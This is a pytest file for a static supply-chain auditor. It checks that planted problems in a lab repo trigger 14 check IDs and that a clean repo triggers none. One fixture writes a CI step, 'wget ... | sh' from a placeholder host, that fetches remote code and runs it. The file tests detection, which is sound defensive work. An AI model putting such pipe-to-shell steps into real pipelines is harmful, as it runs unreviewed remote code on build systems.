"""Static supply-chain checks (c26/c27): plants found, clean-repo silent."""
import json, os, subprocess, sys, tempfile, shutil
H = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LAB_ROOT = os.path.dirname(H)
LAB = os.path.join(LAB_ROOT, "vuln-lab", "client-repo")
CLEAN = f"{H}/variants/clean-repo"
AUD = os.path.join(LAB_ROOT, "lab-run", "audit_envelope.py")
SCORE = os.path.join(LAB_ROOT, "vuln-lab", "scripts", "score.py")
SUPPLY = {
    "NEW-DOCKER-FROM-PIN", "NEW-DOCKER-PIPE-SHELL", "NEW-CICD-PIPE-SHELL", "NEW-DOCKER-EOL-BASE",
    "NEW-DEPS-UNPINNED", "NEW-DEPS-NO-LOCKFILE", "NEW-DOCKER-UNPINNED-INSTALL", "NEW-DEPS-UPDATE-HYGIENE",
    "NEW-DOCKER-ADD-REMOTE", "NEW-AGENT-PROMPT-INJECT", "NEW-AGENT-SKILL-SCRIPT",
    "NEW-AGENT-MCP-PIN", "NEW-AGENT-MCP-SECRETS", "NEW-AGENT-MCP-FS",
}

def _run(repo, out):
    env = dict(os.environ, ENVELOPE_OUT=out)
    p = subprocess.run([sys.executable, AUD, "--repo", repo, "--static-only"], env=env, capture_output=True, text=True)
    assert p.returncode == 0, p.stderr
    return json.load(open(f"{out}/findings-envelope.json"))["findings"]

def test_plants_emit_all_supply_checks(tmp_path):
    fs = _run(LAB, str(tmp_path / "plant"))
    ids = {f["check_id"] for f in fs}
    missing = SUPPLY - ids
    assert not missing, f"missing supply checks: {missing}"

def test_clean_repo_zero_findings(tmp_path):
    fs = _run(CLEAN, str(tmp_path / "clean"))
    assert fs == [], f"false positives on clean-repo: {[(f['check_id'], f['title'][:80]) for f in fs]}"

def test_score_supply_categories(tmp_path):
    out = tmp_path / "plant"
    fs = _run(LAB, str(out))
    findings = out / "findings-envelope.json"
    # rewrite to only what score needs (already there)
    p = subprocess.run([sys.executable, SCORE, str(findings), "--categories", "c26,c27", "--json", str(tmp_path / "s.json")],
                       capture_output=True, text=True)
    assert p.returncode == 0, p.stderr + p.stdout
    sc = json.load(open(tmp_path / "s.json"))
    assert sc["detected"] == 14 and sc["enabled"] == 14 and sc["coverage_pct"] == 100.0, sc

def test_pipe_shell_and_mcp_pin_unit():
    """Direct regex / pin heuristics without a full repo walk."""
    sys.path.insert(0, os.path.join(LAB_ROOT, "lab-run"))
    # load the module constants by exec of the relevant lines is heavy; re-check via a mini repo
    root = tempfile.mkdtemp(prefix="roqy-sc-")
    try:
        os.makedirs(f"{root}/.github/workflows")
        os.makedirs(f"{root}/.cursor")
        open(f"{root}/.github/workflows/x.yml", "w").write(
            "name: x\non: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: wget -qO- https://example.invalid/x.sh | sh\n"
        )
        open(f"{root}/.cursor/mcp.json", "w").write(json.dumps({
            "mcpServers": {"s": {"command": "npx", "args": ["-y", "cool-mcp@latest"]}}
        }))
        out = tempfile.mkdtemp()
        fs = _run(root, out)
        ids = {f["check_id"] for f in fs}
        assert "NEW-CICD-PIPE-SHELL" in ids
        assert "NEW-AGENT-MCP-PIN" in ids
    finally:
        shutil.rmtree(root, ignore_errors=True)
